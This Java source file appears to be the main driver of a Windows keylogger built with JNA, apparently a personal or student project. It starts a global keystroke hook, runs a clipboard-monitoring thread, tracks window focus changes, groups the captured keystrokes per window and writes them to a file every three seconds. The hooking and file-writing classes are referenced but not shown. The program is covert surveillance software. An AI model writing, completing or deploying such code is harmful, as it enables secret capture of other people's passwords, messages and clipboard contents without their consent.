import com.sun.jna.platform.win32.WinDef;

import java.util.Timer;

public class MainDriver {
    private static final int intervalDuration = 3;
    private static int currentKey = 1;
    public static WinDef.HWND prevFg = null;
    public static boolean focusedLoosed = true;

    public static void main(String[] args) {
        KeyLogger keyLogger = new KeyLogger();
//        ClipBoardMonitor clipBoardMonitor = new ClipBoardMonitor();
        EnumerateWindows enumerateWindows = new EnumerateWindows();
        int index = 1;
        try {
            Timer timer = new Timer();
            timer.schedule(new FileWriting(), 0, intervalDuration * 1000);
            keyLogger.startHook();
            ClipBoardMonitor b = new ClipBoardMonitor();
            Thread thread = new Thread(b);
            thread.start();
            while (true) {
                int prvCount = EnumerateWindows.getHashMap().size();
                try {
                    Thread.sleep(200);
                } catch (InterruptedException e) {
                    e.printStackTrace();// my name is salman and testing. my name is salman.
                }

                enumerateWindows.run();
                focusedLoosed = prvCount != EnumerateWindows.getHashMap().size();
                if (focusedLoosed) {// my name is salman and hello from intellij.
                    currentKey += getRandomKey();
                    KeyLogger.balancedBST.root = KeyLogger.balancedBST.insert(currentKey, index++ + "," + KeyLogger.linkedList.toString());
                    KeyLogger.linkedList.clear();
                }
//                clipBoardMonitor.run();
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    // method that returns random key between 1-10
    public static int getRandomKey() {
        return (int) (Math.random() * 3 + 1);
    }
}
